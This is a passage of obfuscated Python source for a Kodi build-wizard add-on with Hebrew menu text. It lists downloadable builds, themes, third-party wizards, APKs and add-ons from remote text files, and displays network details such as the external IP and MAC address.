	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000OO00O0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O0OO0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000OOOOO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0000O0OO0O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	setView ('files','viewType')#line:2198
def buildMenu ():#line:2200
	if USERNAME =='':#line:2201
		ADDON .openSettings ()#line:2202
		sys .exit ()#line:2203
	if PASSWORD =='':#line:2204
		ADDON .openSettings ()#line:2205
	O000000O0O0OO0OO0 =(SPEEDFILE )#line:2206
	(O000000O0O0OO0OO0 )#line:2207
	O00OO0O00OOO0OO0O =(wiz .workingURL (O000000O0O0OO0OO0 ))#line:2208
	(O00OO0O00OOO0OO0O )#line:2209
	O00OO0O00OOO0OO0O =wiz .workingURL (SPEEDFILE )#line:2210
	if not O00OO0O00OOO0OO0O ==True :#line:2211
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2213
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2214
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addFile ('%s'%O00OO0O00OOO0OO0O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
	else :#line:2217
		O0O0OO00OO000O0O0 ,OOO00000O000O00O0 ,O0O0OO0OO000OOO0O ,O00O00OOO0OOO0O0O ,O0OO0OO00OO0O00OO ,O0OOO0OO00O000OO0 ,OO00000OOOO0OOOO0 =wiz .buildCount ()#line:2218
		OOO0OO0O0O0OOOOO0 =False ;O0O000OOOO00OOOO0 =[]#line:2219
		if THIRDPARTY =='true':#line:2220
			if not THIRD1NAME ==''and not THIRD1URL =='':OOO0OO0O0O0OOOOO0 =True ;O0O000OOOO00OOOO0 .append ('1')#line:2221
			if not THIRD2NAME ==''and not THIRD2URL =='':OOO0OO0O0O0OOOOO0 =True ;O0O000OOOO00OOOO0 .append ('2')#line:2222
			if not THIRD3NAME ==''and not THIRD3URL =='':OOO0OO0O0O0OOOOO0 =True ;O0O000OOOO00OOOO0 .append ('3')#line:2223
		O0OO000O00O0OOO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2224
		OOOO000OOOO0O00O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO000O00O0OOO00 )#line:2225
		if O0O0OO00OO000O0O0 ==1 and OOO0OO0O0O0OOOOO0 ==False :#line:2226
			for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2227
				if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2228
				if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2229
				viewBuild (OOOO000OOOO0O00O0 [0 ][0 ])#line:2230
				return #line:2231
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2234
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2235
		if OOO0OO0O0O0OOOOO0 ==True :#line:2236
			for OOOO0OOOOO0000OO0 in O0O000OOOO00OOOO0 :#line:2237
				O0O00OOO0O0O000OO =eval ('THIRD%sNAME'%OOOO0OOOOO0000OO0 )#line:2238
		if len (OOOO000OOOO0O00O0 )>=1 :#line:2240
			if SEPERATE =='true':#line:2241
				for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2242
					if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2243
					if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2244
					O0000OO0OOOO0OO0O =createMenu ('install','',O0O00OOO0O0O000OO )#line:2245
					addDir ('[%s] %s (v%s)'%(float (OO00OOOOOO0O0OOO0 ),O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ),'viewbuild',O0O00OOO0O0O000OO ,description =OO00000O0OO00O0O0 ,fanart =O00O00000O0O0000O ,icon =OO0O0O0OO00OO0O00 ,menu =O0000OO0OOOO0OO0O ,themeit =THEME2 )#line:2246
			else :#line:2247
				if O00O00OOO0OOO0O0O >0 :#line:2248
					O0000O000OO00000O ='+'if SHOW17 =='false'else '-'#line:2249
					if SHOW17 =='true':#line:2251
						for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2253
							if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2255
							O0O0O0OO00OOO0O0O =int (float (OO00OOOOOO0O0OOO0 ))#line:2256
							if O0O0O0OO00OOO0O0O ==17 :#line:2257
								O0000OO0OOOO0OO0O =createMenu ('install','',O0O00OOO0O0O000OO )#line:2258
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOOO0O0OOO0 ),O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ),'viewbuild',O0O00OOO0O0O000OO ,description =OO00000O0OO00O0O0 ,fanart =O00O00000O0O0000O ,icon =OO0O0O0OO00OO0O00 ,menu =O0000OO0OOOO0OO0O ,themeit =THEME2 )#line:2259
				if O0OO0OO00OO0O00OO >0 :#line:2260
					O0000O000OO00000O ='+'if SHOW18 =='false'else '-'#line:2261
					if SHOW18 =='true':#line:2263
						for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2265
							if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2266
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2267
							O0O0O0OO00OOO0O0O =int (float (OO00OOOOOO0O0OOO0 ))#line:2268
							if O0O0O0OO00OOO0O0O ==18 :#line:2269
								O0000OO0OOOO0OO0O =createMenu ('install','',O0O00OOO0O0O000OO )#line:2270
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOOO0O0OOO0 ),O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ),'viewbuild',O0O00OOO0O0O000OO ,description =OO00000O0OO00O0O0 ,fanart =O00O00000O0O0000O ,icon =OO0O0O0OO00OO0O00 ,menu =O0000OO0OOOO0OO0O ,themeit =THEME2 )#line:2271
				if O0O0OO0OO000OOO0O >0 :#line:2272
					O0000O000OO00000O ='+'if SHOW16 =='false'else '-'#line:2273
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0000O000OO00000O ,O0O0OO0OO000OOO0O ),'togglesetting','show16',themeit =THEME3 )#line:2274
					if SHOW16 =='true':#line:2275
						for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2276
							if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2277
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2278
							O0O0O0OO00OOO0O0O =int (float (OO00OOOOOO0O0OOO0 ))#line:2279
							if O0O0O0OO00OOO0O0O ==16 :#line:2280
								O0000OO0OOOO0OO0O =createMenu ('install','',O0O00OOO0O0O000OO )#line:2281
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOOO0O0OOO0 ),O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ),'viewbuild',O0O00OOO0O0O000OO ,description =OO00000O0OO00O0O0 ,fanart =O00O00000O0O0000O ,icon =OO0O0O0OO00OO0O00 ,menu =O0000OO0OOOO0OO0O ,themeit =THEME2 )#line:2282
				if OOO00000O000O00O0 >0 :#line:2283
					O0000O000OO00000O ='+'if SHOW15 =='false'else '-'#line:2284
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0000O000OO00000O ,OOO00000O000O00O0 ),'togglesetting','show15',themeit =THEME3 )#line:2285
					if SHOW15 =='true':#line:2286
						for O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ,O000OOO000OO0O0O0 ,OOOOO0O0OO000O00O ,OO00OOOOOO0O0OOO0 ,OO0O0OOOOO0O0OOOO ,OO0O0O0OO00OO0O00 ,O00O00000O0O0000O ,OO0000O000OO0O000 ,OO00000O0OO00O0O0 in OOOO000OOOO0O00O0 :#line:2287
							if not SHOWADULT =='true'and OO0000O000OO0O000 .lower ()=='yes':continue #line:2288
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOO0O0O000OO ):continue #line:2289
							O0O0O0OO00OOO0O0O =int (float (OO00OOOOOO0O0OOO0 ))#line:2290
							if O0O0O0OO00OOO0O0O <=15 :#line:2291
								O0000OO0OOOO0OO0O =createMenu ('install','',O0O00OOO0O0O000OO )#line:2292
								addDir ('[%s] %s (v%s)'%(float (OO00OOOOOO0O0OOO0 ),O0O00OOO0O0O000OO ,OO0O0O00O0OOOOO0O ),'viewbuild',O0O00OOO0O0O000OO ,description =OO00000O0OO00O0O0 ,fanart =O00O00000O0O0000O ,icon =OO0O0O0OO00OO0O00 ,menu =O0000OO0OOOO0OO0O ,themeit =THEME2 )#line:2293
		elif OO00000OOOO0OOOO0 >0 :#line:2294
			if O0OOO0OO00O000OO0 >0 :#line:2295
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
			else :#line:2298
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
	setView ('files','viewType')#line:2301
def viewBuild (O0O0OOO00OO0OOO0O ):#line:2303
	O0OO00O0OO000O0OO =wiz .workingURL (SPEEDFILE )#line:2304
	if not O0OO00O0OO000O0OO ==True :#line:2305
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2306
		addFile ('%s'%O0OO00O0OO000O0OO ,'',themeit =THEME3 )#line:2307
		return #line:2308
	if wiz .checkBuild (O0O0OOO00OO0OOO0O ,'version')==False :#line:2309
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2310
		addFile ('%s was not found in the builds list.'%O0O0OOO00OO0OOO0O ,'',themeit =THEME3 )#line:2311
		return #line:2312
	OO0O0O00O00O00O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2313
	OOOOOOO00000O0O00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0OOO00OO0OOO0O ).findall (OO0O0O00O00O00O0O )#line:2314
	for O0OO00OOOO0O0000O ,O0O000O00O0OOO00O ,OOO0OO000000O0O00 ,OO000000O00OOO0O0 ,O00O0O0O0O0O0OO0O ,O0OOO0OO0OOO00O0O ,OO0OOO0OOOOO0OOOO ,O0OOOOOOO00O0OOOO ,O0OO000000O000OOO ,OOO0O000OOO00O0OO in OOOOOOO00000O0O00 :#line:2315
		O0OOO0OO0OOO00O0O =O0OOO0OO0OOO00O0O if wiz .workingURL (O0OOO0OO0OOO00O0O )else ICON #line:2316
		OO0OOO0OOOOO0OOOO =OO0OOO0OOOOO0OOOO if wiz .workingURL (OO0OOO0OOOOO0OOOO )else FANART #line:2317
		OOO0OO0OOO000O00O ='%s (v%s)'%(O0O0OOO00OO0OOO0O ,O0OO00OOOO0O0000O )#line:2318
		if BUILDNAME ==O0O0OOO00OO0OOO0O and O0OO00OOOO0O0000O >BUILDVERSION :#line:2319
			OOO0OO0OOO000O00O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO0OO0OOO000O00O ,BUILDVERSION )#line:2320
		O00OOO000O0OO0OOO =int (float (KODIV ));OO000OO000O0O00OO =int (float (OO000000O00OOO0O0 ))#line:2329
		if not O00OOO000O0OO0OOO ==OO000OO000O0O00OO :#line:2330
			if O00OOO000O0OO0OOO ==16 and OO000OO000O0O00OO <=15 :O0O00O0O0OO0O0000 =False #line:2331
			else :O0O00O0O0OO0O0000 =True #line:2332
		else :O0O00O0O0OO0O0000 =False #line:2333
		addFile ('התקנה','install',O0O0OOO00OO0OOO0O ,'fresh',description =OOO0O000OOO00O0OO ,fanart =OO0OOO0OOOOO0OOOO ,icon =O0OOO0OO0OOO00O0O ,themeit =THEME1 )#line:2337
		if not O00O0O0O0O0O0OO0O =='http://':#line:2340
			if wiz .workingURL (O00O0O0O0O0O0OO0O )==True :#line:2341
				addFile (wiz .sep ('THEMES'),'',fanart =OO0OOO0OOOOO0OOOO ,icon =O0OOO0OO0OOO00O0O ,themeit =THEME3 )#line:2342
				OO0O0O00O00O00O0O =wiz .openURL (O00O0O0O0O0O0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2343
				OOOOOOO00000O0O00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O00O00O00O0O )#line:2344
				for OO00O0O0OOOO00OOO ,OOOOOO0OO00O000O0 ,O00OOO0OO00000000 ,O00O0O0OOO0O0O0O0 ,OO00O0O000OO0O0OO ,OOO0O000OOO00O0OO in OOOOOOO00000O0O00 :#line:2345
					if not SHOWADULT =='true'and OO00O0O000OO0O0OO .lower ()=='yes':continue #line:2346
					O00OOO0OO00000000 =O00OOO0OO00000000 if O00OOO0OO00000000 =='http://'else O0OOO0OO0OOO00O0O #line:2347
					O00O0O0OOO0O0O0O0 =O00O0O0OOO0O0O0O0 if O00O0O0OOO0O0O0O0 =='http://'else OO0OOO0OOOOO0OOOO #line:2348
					addFile (OO00O0O0OOOO00OOO if not OO00O0O0OOOO00OOO ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO00O0O0OOOO00OOO ,'theme',O0O0OOO00OO0OOO0O ,OO00O0O0OOOO00OOO ,description =OOO0O000OOO00O0OO ,fanart =O00O0O0OOO0O0O0O0 ,icon =O00OOO0OO00000000 ,themeit =THEME3 )#line:2349
	setView ('files','viewType')#line:2350
def viewThirdList (OOO00O00O0OOO00OO ):#line:2352
	O0000O000OOOO000O =eval ('THIRD%sNAME'%OOO00O00O0OOO00OO )#line:2353
	O0O000O00OOOOO0OO =eval ('THIRD%sURL'%OOO00O00O0OOO00OO )#line:2354
	O0OOOO00000O0OOOO =wiz .workingURL (O0O000O00OOOOO0OO )#line:2355
	if not O0OOOO00000O0OOOO ==True :#line:2356
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2357
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2358
	else :#line:2359
		O000O0OOOO0OOOO0O ,OO0O0OOOO00O000OO =wiz .thirdParty (O0O000O00OOOOO0OO )#line:2360
		addFile ("[B]%s[/B]"%O0000O000OOOO000O ,'',themeit =THEME3 )#line:2361
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2362
		if O000O0OOOO0OOOO0O :#line:2363
			for O0000O000OOOO000O ,O0OO00O0000000OO0 ,O0O000O00OOOOO0OO ,O000O00O0OOOOO0O0 ,OO000O000O00OOO0O ,O0O0000O00O0OOO0O ,O000O0O0OOOOOOOO0 ,O00OOO0O00O00O00O in OO0O0OOOO00O000OO :#line:2364
				if not SHOWADULT =='true'and O000O0O0OOOOOOOO0 .lower ()=='yes':continue #line:2365
				addFile ("[%s] %s v%s"%(O000O00O0OOOOO0O0 ,O0000O000OOOO000O ,O0OO00O0000000OO0 ),'installthird',O0000O000OOOO000O ,O0O000O00OOOOO0OO ,icon =OO000O000O00OOO0O ,fanart =O0O0000O00O0OOO0O ,description =O00OOO0O00O00O00O ,themeit =THEME2 )#line:2366
		else :#line:2367
			for O0000O000OOOO000O ,O0O000O00OOOOO0OO ,OO000O000O00OOO0O ,O0O0000O00O0OOO0O ,O00OOO0O00O00O00O in OO0O0OOOO00O000OO :#line:2368
				addFile (O0000O000OOOO000O ,'installthird',O0000O000OOOO000O ,O0O000O00OOOOO0OO ,icon =OO000O000O00OOO0O ,fanart =O0O0000O00O0OOO0O ,description =O00OOO0O00O00O00O ,themeit =THEME2 )#line:2369
def editThirdParty (OOO0OOO00O000O00O ):#line:2371
	OOO0OO0O00O0OOOOO =eval ('THIRD%sNAME'%OOO0OOO00O000O00O )#line:2372
	O000O0000OO0OOO0O =eval ('THIRD%sURL'%OOO0OOO00O000O00O )#line:2373
	O0O00O00OO00OOOO0 =wiz .getKeyboard (OOO0OO0O00O0OOOOO ,'Enter the Name of the Wizard')#line:2374
	O0O00O0OOOOO0OO00 =wiz .getKeyboard (O000O0000OO0OOO0O ,'Enter the URL of the Wizard Text')#line:2375
	wiz .setS ('wizard%sname'%OOO0OOO00O000O00O ,O0O00O00OO00OOOO0 )#line:2377
	wiz .setS ('wizard%surl'%OOO0OOO00O000O00O ,O0O00O0OOOOO0OO00 )#line:2378
def apkScraper (name =""):#line:2380
	if name =='kodi':#line:2381
		OO00000O00O00000O ='http://mirrors.kodi.tv/releases/android/arm/'#line:2382
		OOO0O0OO0OOO00O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2383
		O0OOOOOO0OOOOOO00 =wiz .openURL (OO00000O00O00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2384
		OOO0O0OOOO00O0OO0 =wiz .openURL (OOO0O0OO0OOO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2385
		O000O0O0OOO0O0000 =0 #line:2386
		OOO0OO00OOOO00O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OOOOOO0OOOOOO00 )#line:2387
		O0O000OO0000OO0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0O0OOOO00O0OO0 )#line:2388
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2390
		O0OOOO00O0O0O00OO =False #line:2391
		for O0O000000OO000000 ,name ,O00O0O0OO00O0OOO0 ,O0O00OO0OO00OO0O0 in OOO0OO00OOOO00O00 :#line:2392
			if O0O000000OO000000 in ['../','old/']:continue #line:2393
			if not O0O000000OO000000 .endswith ('.apk'):continue #line:2394
			if not O0O000000OO000000 .find ('_')==-1 and O0OOOO00O0O0O00OO ==True :continue #line:2395
			try :#line:2396
				OO0OO0000O00OO0O0 =name .split ('-')#line:2397
				if not O0O000000OO000000 .find ('_')==-1 :#line:2398
					O0OOOO00O0O0O00OO =True #line:2399
					O0OO000OOOOO000OO ,O00O00O0O0O00OO00 =OO0OO0000O00OO0O0 [2 ].split ('_')#line:2400
				else :#line:2401
					O0OO000OOOOO000OO =OO0OO0000O00OO0O0 [2 ]#line:2402
					O00O00O0O0O00OO00 =''#line:2403
				OOOO00O0O0O000OOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0000O00OO0O0 [0 ].title (),OO0OO0000O00OO0O0 [1 ],O00O00O0O0O00OO00 .upper (),O0OO000OOOOO000OO ,COLOR2 ,O00O0O0OO00O0OOO0 .replace (' ',''),COLOR1 ,O0O00OO0OO00OO0O0 )#line:2404
				O0O000OOOO0OO00OO =urljoin (OO00000O00O00000O ,O0O000000OO000000 )#line:2405
				addFile (OOOO00O0O0O000OOO ,'apkinstall',"%s v%s%s %s"%(OO0OO0000O00OO0O0 [0 ].title (),OO0OO0000O00OO0O0 [1 ],O00O00O0O0O00OO00 .upper (),O0OO000OOOOO000OO ),O0O000OOOO0OO00OO )#line:2406
				O000O0O0OOO0O0000 +=1 #line:2407
			except :#line:2408
				wiz .log ("Error on: %s"%name )#line:2409
		for O0O000000OO000000 ,name ,O00O0O0OO00O0OOO0 ,O0O00OO0OO00OO0O0 in O0O000OO0000OO0O0 :#line:2411
			if O0O000000OO000000 in ['../','old/']:continue #line:2412
			if not O0O000000OO000000 .endswith ('.apk'):continue #line:2413
			if not O0O000000OO000000 .find ('_')==-1 :continue #line:2414
			try :#line:2415
				OO0OO0000O00OO0O0 =name .split ('-')#line:2416
				OOOO00O0O0O000OOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0000O00OO0O0 [0 ].title (),OO0OO0000O00OO0O0 [1 ],OO0OO0000O00OO0O0 [2 ],COLOR2 ,O00O0O0OO00O0OOO0 .replace (' ',''),COLOR1 ,O0O00OO0OO00OO0O0 )#line:2417
				O0O000OOOO0OO00OO =urljoin (OOO0O0OO0OOO00O0O ,O0O000000OO000000 )#line:2418
				addFile (OOOO00O0O0O000OOO ,'apkinstall',"%s v%s %s"%(OO0OO0000O00OO0O0 [0 ].title (),OO0OO0000O00OO0O0 [1 ],OO0OO0000O00OO0O0 [2 ]),O0O000OOOO0OO00OO )#line:2419
				O000O0O0OOO0O0000 +=1 #line:2420
			except :#line:2421
				wiz .log ("Error on: %s"%name )#line:2422
		if O000O0O0OOO0O0000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2423
	elif name =='spmc':#line:2424
		O0O000OOO00000OOO ='https://github.com/koying/SPMC/releases'#line:2425
		O0OOOOOO0OOOOOO00 =wiz .openURL (O0O000OOO00000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2426
		O000O0O0OOO0O0000 =0 #line:2427
		OOO0OO00OOOO00O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0OOOOOO0OOOOOO00 )#line:2428
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2430
		for name ,O0O00OO00O00O000O in OOO0OO00OOOO00O00 :#line:2432
			OO00OOOO0O0O0O0O0 =''#line:2433
			O0O000OO0000OO0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O00OO00O00O000O )#line:2434
			for O0OOOO000OOO00OO0 ,O0O0O00O0OOOO0OOO ,O0O0O0O00OO00O00O in O0O000OO0000OO0O0 :#line:2435
				if O0O0O0O00OO00O00O .find ('armeabi')==-1 :continue #line:2436
				if O0O0O0O00OO00O00O .find ('launcher')>-1 :continue #line:2437
				OO00OOOO0O0O0O0O0 =urljoin ('https://github.com',O0OOOO000OOO00OO0 )#line:2438
				break #line:2439
		if O000O0O0OOO0O0000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2441
def apkMenu (url =None ):#line:2443
	if url ==None :#line:2444
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2447
	if not APKFILE =='http://':#line:2448
		if url ==None :#line:2449
			O0O0000OO000O000O =wiz .workingURL (APKFILE )#line:2450
			O000OO0OO0OO0000O =uservar .APKFILE #line:2451
		else :#line:2452
			O0O0000OO000O000O =wiz .workingURL (url )#line:2453
			O000OO0OO0OO0000O =url #line:2454
		if O0O0000OO000O000O ==True :#line:2455
			OOO0O0O000OOO00OO =wiz .openURL (O000OO0OO0OO0000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2456
			O00O0OOOO0OOOOO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O0O000OOO00OO )#line:2457
			if len (O00O0OOOO0OOOOO00 )>0 :#line:2458
				O00O0O0O0O00OO000 =0 #line:2459
				for OO0O0O0OO00OOOOO0 ,OO0O0OO0OOO0O000O ,url ,O000O000OO0OO000O ,OO0OOO0000O0OOO00 ,O0000O00O0OOOO000 ,OO0O0O0O000O00O00 in O00O0OOOO0OOOOO00 :#line:2460
					if not SHOWADULT =='true'and O0000O00O0OOOO000 .lower ()=='yes':continue #line:2461
					if OO0O0OO0OOO0O000O .lower ()=='yes':#line:2462
						O00O0O0O0O00OO000 +=1 #line:2463
						addDir ("[B]%s[/B]"%OO0O0O0OO00OOOOO0 ,'apk',url ,description =OO0O0O0O000O00O00 ,icon =O000O000OO0OO000O ,fanart =OO0OOO0000O0OOO00 ,themeit =THEME3 )#line:2464
					else :#line:2465
						O00O0O0O0O00OO000 +=1 #line:2466
						addFile (OO0O0O0OO00OOOOO0 ,'apkinstall',OO0O0O0OO00OOOOO0 ,url ,description =OO0O0O0O000O00O00 ,icon =O000O000OO0OO000O ,fanart =OO0OOO0000O0OOO00 ,themeit =THEME2 )#line:2467
					if O00O0O0O0O00OO000 <1 :#line:2468
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2469
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2470
		else :#line:2471
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2472
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2473
			addFile ('%s'%O0O0000OO000O000O ,'',themeit =THEME3 )#line:2474
		return #line:2475
	else :wiz .log ("[APK Menu] No APK list added.")#line:2476
	setView ('files','viewType')#line:2477
def addonMenu (url =None ):#line:2479
	if not ADDONFILE =='http://':#line:2480
		if url ==None :#line:2481
			OOO00OOOO0OO0O00O =wiz .workingURL (ADDONFILE )#line:2482
			O00000O0OO0OOOO00 =uservar .ADDONFILE #line:2483
		else :#line:2484
			OOO00OOOO0OO0O00O =wiz .workingURL (url )#line:2485
			O00000O0OO0OOOO00 =url #line:2486
		if OOO00OOOO0OO0O00O ==True :#line:2487
			O0OOO00OOO000OOO0 =wiz .openURL (O00000O0OO0OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2488
			OO00OO0O0O0O00O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOO00OOO000OOO0 )#line:2489
			if len (OO00OO0O0O0O00O0O )>0 :#line:2490
				O000OOOOO0O00000O =0 #line:2491
				for OOOOOO00OOO0O00OO ,O00OOO0O000OO0OO0 ,url ,O000OO00000O0OOOO ,O0OO0OOO0000OO00O ,O0O00O00000O0OOO0 ,OOO00O0O0O00O0000 ,OOO00000O00OOOO0O ,O000O00O0OO000000 ,O00OO00O0O00O0OOO in OO00OO0O0O0O00O0O :#line:2492
					if O00OOO0O000OO0OO0 .lower ()=='section':#line:2493
						O000OOOOO0O00000O +=1 #line:2494
						addDir ("[B]%s[/B]"%OOOOOO00OOO0O00OO ,'addons',url ,description =O00OO00O0O00O0OOO ,icon =OOO00O0O0O00O0000 ,fanart =OOO00000O00OOOO0O ,themeit =THEME3 )#line:2495
					else :#line:2496
						if not SHOWADULT =='true'and O000O00O0OO000000 .lower ()=='yes':continue #line:2497
						try :#line:2498
